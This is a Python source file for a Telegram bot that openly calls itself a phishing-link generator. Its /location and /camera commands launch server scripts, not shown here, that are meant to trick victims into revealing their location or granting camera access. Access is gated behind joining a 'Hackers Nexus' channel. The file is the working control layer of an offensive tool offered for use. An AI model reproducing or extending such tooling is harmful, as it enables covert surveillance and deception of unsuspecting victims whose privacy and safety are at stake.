import telebot 
import os 
import time
import sys
from telebot import types
file = open("Authentication/bot_token.txt", "r")
token = file.read()
file.close()
token = str(token)
token = token.replace("\n", "")

bot = telebot.TeleBot(token)


@bot.message_handler(commands=['start'])
def start(message) :
    file = open("Authentication/users.txt", "r")
    chat_id = message.chat.id
    users = file.read()
    if str(message.chat.id) in str(users) :
        bot.send_message(message.chat.id, """I am Padrio Bot 🤖 
Description 💬 
My name is PydrioBot 
created by @isp_programer 🧑‍💻 
you can generate phishing link through me 🔗

Commands 🎯
/location : To generate instagram location hacking  link
/camera : To generate camera  phishing link""")
    else :
        CHANNEL_USERNAME = open("Authentication/channel_link", "r")
        CHANNEL_USERNAME = CHANNEL_USERNAME.read()
        CHANNEL_USERNAME = CHANNEL_USERNAME.replace("\n", "")
        CHANNEL_USERNAME = CHANNEL_USERNAME.replace("https://t.me/", "")
        CHANNEL_USERNAME = CHANNEL_USERNAME.replace("@", "")
        CHANNEL_USERNAME = "@"+ CHANNEL_USERNAME

        channel = CHANNEL_USERNAME.replace("@", "")

        join_button = types.InlineKeyboardButton(text='𝐇𝐚𝐜𝐤𝐞𝐫𝐬 𝐍𝐞𝐱𝐮𝐬 👾', url=f'https://t.me/{channel}')

        markup = types.InlineKeyboardMarkup().add(join_button)

        bot.send_message(message.chat.id, f"𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹", reply_markup=markup)

        joined_button = types.InlineKeyboardButton(text='Joined', callback_data='joined')

        joined_markup = types.InlineKeyboardMarkup().add(joined_button)

        bot.send_message(chat_id, "After joining, press the button below :", reply_markup=joined_markup)


        @bot.callback_query_handler(func=lambda call: call.data == 'joined')
        def callback_query(call):
           chat_id = call.message.chat.id
           # Check if the user is in the channel
           try:
               member = bot.get_chat_member(CHANNEL_USERNAME, chat_id)
               if member.status in ['member', 'administrator', 'creator']:
                   bot.send_message(chat_id, """I am Padrio Bot 🤖 
Description 💬 
My name is PydrioBot 
created by @isp_programer 🧑‍💻 
you can generate phishing link through me 🔗

Commands 🎯
/location : To generate instagram location hacking  link
/camera : To generate camera  phishing link""")
                   file = open("Authentication/users.txt", "a")
                   file.write("\n"+str(chat_id))
                   file.close()
               else:
                   bot.send_message(chat_id, "It seems you haven't joined the channel yet. Please join and try again.")
           except telebot.apihelper.ApiTelegramException:
               bot.send_message(chat_id, "It seems you haven't joined the channel yet. Please join and try again.")



#bot.polling()






@bot.message_handler(commands=['location'])
def start_phishing_page(message) :
    #print(f'python location/server.py {token} {message.chat.id}')
    users = open("Authentication/users.txt")
    users = users.read()
    if str(message.chat.id) in str(users) :
        bot.send_message(message.chat.id, "🤖 staring the server...")
        file = open(f"camera/permission_value{message.chat.id}.txt", "w")
        file.write("close")
        file.close()
        file = open(f"location/permission_value{message.chat.id}.txt", "w")
        file.write("")
        file.close()

        file = open("Authentication/bot_token.txt", "r")
        t = file.read()
        file.close()
        t = str(token)
        t = t.replace("\n", "")
        print(t)
        chat_id = str(message.chat.id)
        data = f'python location/server.py main {t} {chat_id}'
        print(data)
        os.system(data)
    else :
        CHANNEL_USERNAME = open("Authentication/channel_link", "r")
        CHANNEL_USERNAME = CHANNEL_USERNAME.read()
        CHANNEL_USERNAME = CHANNEL_USERNAME.replace("\n", "")
        CHANNEL_USERNAME = CHANNEL_USERNAME.replace("https://t.me/", "")
        CHANNEL_USERNAME = CHANNEL_USERNAME.replace("@", "")
        CHANNEL_USERNAME = "@"+ CHANNEL_USERNAME

        channel = CHANNEL_USERNAME.replace("@", "")

        join_button = types.InlineKeyboardButton(text='𝐇𝐚𝐜𝐤𝐞𝐫𝐬 𝐍𝐞𝐱𝐮𝐬 👾', url=f'https://t.me/{channel}')

        markup = types.InlineKeyboardMarkup().add(join_button)

        bot.send_message(message.chat.id, f"𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹", reply_markup=markup)

        joined_button = types.InlineKeyboardButton(text='Joined', callback_data='joined')

        joined_markup = types.InlineKeyboardMarkup().add(joined_button)

        bot.send_message(chat_id, "After joining, press the button below :", reply_markup=joined_markup)


        @bot.callback_query_handler(func=lambda call: call.data == 'joined')
        def callback_query(call):
           chat_id = call.message.chat.id
           # Check if the user is in the channel
           try:
               member = bot.get_chat_member(CHANNEL_USERNAME, chat_id)
               if member.status in ['member', 'administrator', 'creator']:
                   bot.send_message(chat_id, """I am Padrio Bot 🤖 
Description 💬 
My name is PydrioBot 
created by @isp_programer 🧑‍💻 
you can generate phishing link through me 🔗

Commands 🎯
/location : To generate instagram location hacking  link
/camera : To generate camera  phishing link""")
                   file = open("Authentication/users.txt", "a")
                   file.write("\n"+str(chat_id))
                   file.close()
               else:
                   bot.send_message(chat_id, "It seems you haven't joined the channel yet. Please join and try again.")
           except telebot.apihelper.ApiTelegramException:
               bot.send_message(chat_id, "It seems you haven't joined the channel yet. Please join and try again.")


@bot.message_handler(commands=['camera'])
def start_phishing_page(message) :
    file = open(f"location/permission_value{message.chat.id}.txt", "w")
    file.write("close")
    file.close()

    file = open(f"camera/permission_value{message.chat.id}.txt", "w")
    file.write("")
    file.close()

    file = open("Authentication/bot_token.txt", "r")
    t = file.read()
    file.close()                                                                  
    t = str(token)
    t = t.replace("\n", "")
    chat_id = str(message.chat.id)


    data = f'python camera/server.py main {t} {chat_id}'

    bot.send_message(message.chat.id, "🤖 starting the server...")
    print(data)
    os.system(data)



@bot.message_handler(commands=['stop_camera'])
def start(message) :
    file = open("Authentication/users.txt", "r")
    chat_id = message.chat.id
    users = file.read()
    if str(message.chat.id) in str(users) :
        bot.send_message(message.chat.id, """stoping the server.......""")
        file = open(f"camera/permission_value{message.chat.id}.txt", "w")
        file.write("close")
        file.close()

    else :
        CHANNEL_USERNAME = open("Authentication/channel_link", "r")
        CHANNEL_USERNAME = CHANNEL_USERNAME.read()
        CHANNEL_USERNAME = CHANNEL_USERNAME.replace("\n", "")
        CHANNEL_USERNAME = CHANNEL_USERNAME.replace("https://t.me/", "")
        CHANNEL_USERNAME = CHANNEL_USERNAME.replace("@", "")
        CHANNEL_USERNAME = "@"+ CHANNEL_USERNAME

        channel = CHANNEL_USERNAME.replace("@", "")

        join_button = types.InlineKeyboardButton(text='𝐇𝐚𝐜𝐤𝐞𝐫𝐬 𝐍𝐞𝐱𝐮𝐬 👾', url=f'https://t.me/{channel}')

        markup = types.InlineKeyboardMarkup().add(join_button)

        bot.send_message(message.chat.id, f"𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹", reply_markup=markup)

        joined_button = types.InlineKeyboardButton(text='Joined', callback_data='joined')

        joined_markup = types.InlineKeyboardMarkup().add(joined_button)

        bot.send_message(chat_id, "After joining, press the button below :", reply_markup=joined_markup)


        @bot.callback_query_handler(func=lambda call: call.data == 'joined')
        def callback_query(call):
           chat_id = call.message.chat.id
           # Check if the user is in the channel
           try:
               member = bot.get_chat_member(CHANNEL_USERNAME, chat_id)
               if member.status in ['member', 'administrator', 'creator']:
                   bot.send_message(chat_id, """I am Padrio Bot 🤖 
Description 💬 
My name is PydrioBot 
created by @isp_programer 🧑‍💻 
you can generate phishing link through me 🔗

Commands 🎯
/location : To generate instagram location hacking  link
/camera : To generate camera  phishing link
/stop to stop the server """)
                   file = open("Authentication/users.txt", "a")
                   file.write("\n"+str(chat_id))
                   file.close()
               else:
                   bot.send_message(chat_id, "It seems you haven't joined the channel yet. Please join and try again.")
           except telebot.apihelper.ApiTelegramException:
               bot.send_message(chat_id, "It seems you haven't joined the channel yet. Please join and try again.")






bot.polling()